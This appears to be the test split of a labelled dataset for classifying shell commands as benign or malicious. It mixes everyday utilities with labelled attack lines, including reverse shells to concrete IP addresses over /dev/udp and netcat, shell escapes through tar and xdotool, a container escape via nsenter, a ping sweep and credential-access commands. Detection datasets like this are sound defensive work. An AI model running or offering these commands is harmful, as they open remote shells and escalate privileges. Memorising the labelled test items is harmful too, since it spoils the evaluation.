id,command,label,source,split
d1_000002,pbpaste | grep search_string,0,tldr,test
d1_000004,zenity --file-selection --directory,0,tldr,test
d1_000007,browsh [-h|--help],0,tldr,test
d1_000010,grub-file --is-x86_64-efi path/to/file,0,tldr,test
d1_000012,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi,1,atomic_red_team,test
d1_000015,minipro [-p|--device] chip_name [-r|--read] path/to/output_file.bin,0,tldr,test
d1_000018,"ps -C python -o rss= | awk '{s+=$1} END{print s/1024 "" MB""}'",0,bash_instruct,test
d1_000019,unset -f ls /bin/ls,0,nl2bash,test
d1_000028,tar xf /path/to/temp-file.tar --to-command /bin/sh,1,gtfobins,test
d1_000029,0<&3;exec 3<>/dev/udp/105.35.248.144/51214; /usr/bin/bash <&3 >&3 2>&3,1,quasarnix,test
d1_000032,grep -m1 -ao '[0-9]' /dev/urandom | sed s/0/10/ | head -n1,0,nl2bash,test
d1_000039,"cut -d, -f9 audit.log | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,test
d1_000056,/usr/bin/python2.7 = cap_sys_ptrace+ep,1,hacktricks,test
d1_000060,oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;,1,hacktricks,test
d1_000062,systemctl stop rabbitmq-server,0,linlm,test
d1_000063,exo compute instance list,0,tldr,test
d1_000066,chmod go-w payload.js,0,bash_instruct,test
d1_000067,"sed 's/\t/,/g' transaction.log > transaction.log.csv",0,bash_instruct,test
d1_000072,var port=12345;,1,gtfobins,test
d1_000073,ssh -p 8080 redis@cdn.internal,0,bash_instruct,test
d1_000079,ss -tan | awk 'NR>1 {print $1}' | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_000082,last reboot | head -1,0,bash6k,test
d1_000085,k8sec set secret_name key=value,0,tldr,test
d1_000111,bconsole,1,gtfobins,test
d1_000113,"zeroclaw cron add ""* * * * *"" ""command""",0,tldr,test
d1_000128,find /etc/apache2 -type f -user operator,0,bash_instruct,test
d1_000131,m4 /path/to/input-file,1,gtfobins,test
d1_000134,"echo ""{:key 'val}"" | bb -I ""(:key (first *input*))""",0,tldr,test
d1_000135,ppmlabel -x pos_x -y pos_y [-t|-text] text path/to/input_file.ppm > path/to/output_file.ppm,0,tldr,test
d1_000136,sed -i 's/old_string/new_string/g' *.txt || { echo 'Error replacing string'; exit 1; },0,bash6k,test
d1_000137,stat -c '%a' users.md,0,bash_instruct,test
d1_000142,"echo ""step_wise"" | sudo tee /sys/class/thermal/thermal_zone0/policy",0,linlm,test
d1_000147,ruff check --select rule_code --add-noqa,0,tldr,test
d1_000148,sudo chgrp users changelog.bak,0,bash_instruct,test
d1_000153,find / -type d -name httpdocs,0,nl2bash,test
d1_000157,pio pkg unpublish package@version,0,tldr,test
d1_000168,anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity,0,tldr,test
d1_000169,docker login registry.example.com,0,linlm,test
d1_000170,docker run -e VAR=value nginx,0,linlm,test
d1_000182,"for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo ""192.168.1.$ip UP"" || : ; done",1,atomic_red_team,test
d1_000189,xxd -l 64 event.sh,0,bash_instruct,test
d1_000193,az tag create [-n|--name] tag_name,0,tldr,test
d1_000196,git mr url,0,tldr,test
d1_000200,fluent-bit -c /etc/fluent-bit/fluent-bit.conf,0,linlm,test
d1_000203,sed 's/^[[:space:]]*//' test.yaml > clean.txt,0,bash_instruct,test
d1_000212,ssh user@hostname,0,linlm,test
d1_000213,0<&3;exec 3<>/dev/udp/53.187.1.44/7687; /usr/bin/sh <&3 >&3 2>&3,1,quasarnix,test
d1_000214,nsenter --target 1 --mount --uts --ipc --net --pid -- bash,1,hacktricks,test
d1_000217,ls -l /tmp/rootsh,1,hacktricks,test
d1_000219,cat order.yaml | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_000222,rpcdump.py domain/username:password@target,0,tldr,test
d1_000223,kylin.sh reload,0,linlm,test
d1_000228,find . -maxdepth 1 -type f | wc -l,0,bash6k,test
d1_000235,nc -e /usr/bin/bash 76.132.177.92 55490,1,quasarnix,test
d1_000238,find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null,1,hacktricks,test
d1_000242,zgrep --context|--before-context|--after-context 3 pattern path/to/compressed_file,0,tldr,test
d1_000252,falcon serve,0,linlm,test
d1_000259,[ -f test.old ] && cat test.old || echo 'not found',0,bash_instruct,test
d1_000276,jhead -purejpg path/to/image.jpg,0,tldr,test
d1_000283,https://h319114cf.example.net/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/,1,hacktricks,test
d1_000302,[ -f data.jpg ] && cat data.jpg || echo 'not found',0,bash_instruct,test
d1_000306,sed '/^$/d' customer.conf,0,bash_instruct,test
d1_000308,tr -d '0-9' < transaction.txt,0,bash_instruct,test
d1_000309,cp -u results.png scripts/,0,bash_instruct,test
d1_000311,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' build.ini | sort -u,0,bash_instruct,test
d1_000315,duf --only-fs|hide-fs tmpfs|vfat|ext4|xfs,0,tldr,test
d1_000324,tail -n 25 mail.log,0,bash_instruct,test
d1_000328,ln -s target,0,nl2bash,test
d1_000332,echo 'scale = 10; 5 / 3' | bc,0,tldr,test
d1_000341,frida-ps,0,tldr,test
d1_000343,"mkdir ""${HOME}/.npm-packages""",0,nl2bash,test
d1_000353,cs resolve group_id:artifact_id:artifact_version --what-depends-on searched_group_id:searched_artifact_id,0,tldr,test
d1_000354,du -h --max-depth=1 static | sort -rh,0,bash_instruct,test
d1_000359,du -h --max-depth=1 build | sort -rh,0,bash_instruct,test
d1_000362,xfreerdp /v:ip_address /u:username /p:password +clipboard,0,tldr,test
d1_000363,sfdk config --show,0,tldr,test
d1_000367,"count=$(find /tmp -type f -empty -print -delete | wc -l); echo ""Removed $count empty files""",0,bash6k,test
d1_000373,chmod +x access.css,0,bash_instruct,test
d1_000383,mount | grep cgroup,1,hacktricks,test
d1_000384,head -n 20 users.json,0,bash_instruct,test
d1_000385,rbw generate password_length,0,tldr,test
d1_000390,restic --password-command='/path/to/command' backup,1,gtfobins,test
d1_000398,sudo chgrp admin customer.jpg,0,bash_instruct,test
d1_000406,find / -context '*:default_t:*' -o -context '*:file_t:*' 2>/dev/null,1,hacktricks,test
d1_000415,touch profile.js,0,bash_instruct,test
d1_000417,sudo xcode-select --reset,0,tldr,test
d1_000419,gcloud logging logs list --bucket=bucket_id --location=location --view=view_id,0,tldr,test
d1_000422,"echo ""install algif_aead /bin/false"" > /etc/modprobe.d/disable-algif.conf",1,hacktricks,test
d1_000435,./stratus detonate aws.credential-access.ec2-get-password-data --force,1,atomic_red_team,test
d1_000436,jpegtopnm [-v|-version],0,tldr,test
d1_000437,find . -name aaa -print,0,nl2bash,test
d1_000438,pkill faunadb,0,linlm,test
d1_000443,dnf reposync --repoid repo_name --download-metadata,0,tldr,test
d1_000461,xdotool exec --sync /bin/sh,1,gtfobins,test
